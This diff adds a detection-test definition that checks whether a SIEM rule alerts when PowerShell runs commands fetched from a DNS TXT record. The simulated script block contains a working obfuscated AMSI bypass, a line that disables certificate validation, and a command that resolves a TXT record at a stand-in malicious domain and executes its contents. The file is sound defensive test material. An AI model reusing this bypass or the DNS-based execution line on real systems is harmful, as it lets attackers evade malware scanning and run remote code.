@@ -1,0 +1,46 @@
+type: job
+name: Windows Powershell Commands from DNS TXT
+detection:
+  source: escu
+  name: "ESCU - Windows Powershell Commands from DNS TXT - Rule"
+  id: b61353cd-5b09-4699-8b86-6517a9038043
+description: |
+  Validates detection of PowerShell running a command fetched from a DNS TXT
+  record: PowerShell/Operational EID 4104 (Script Block Logging) records a
+  block that disables certificate validation, sets the amsiInitFailed field
+  through reflection, and passes the Strings of a Resolve-DnsName -Type TXT
+  lookup to powershell as a command. PowerShell logged the block at Warning
+  level, which it does for blocks it flags as suspicious.
+
+mitre:
+  tactics: [execution, command-and-control]
+  techniques: [T1071.004, T1059.001]
+
+state:
+  domain_short:       CORP
+  domain_tld:         local
+  domain_short_lower: fn.lower(ref.domain_short)
+  domain_fqdn:        "${ref.domain_short_lower}.${ref.domain_tld}"
+  computer:           gen.hostname(class=windows-server, domain=ref.domain_fqdn)
+  level:              3
+
+workloads:
+  - scenario: scenarios/windows/powershell/script-block/script-block-logged
+    bindings:
+      domain_short:      ref.domain_short
+      domain_tld:        ref.domain_tld
+      computer:          ref.computer
+      level:             ref.level
+      provider_guid:     "{A0C1853B-5C40-4B15-8766-3CF1C58F985A}"
+      script_block_text: |-
+        [Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
+        try{
+        [Ref].Assembly.GetType('Sys'+'tem.Man'+'agement.Aut'+'omation.Am'+'siUt'+'ils').GetField('am'+'siIni'+'tFailed', 'NonP'+'ublic,Sta'+'tic').SetValue($null, $true)
+        }catch{}
+        powershell . (resolve-dnsname -name blog.snapattack.mal -type TXT).Strings
+    expectation:
+      expected: alert
+      summary: "PowerShell runs the TXT strings of a Resolve-DnsName lookup as a command"
+      mitre:
+        tactics: [execution, command-and-control]
+        techniques: [T1071.004, T1059.001]
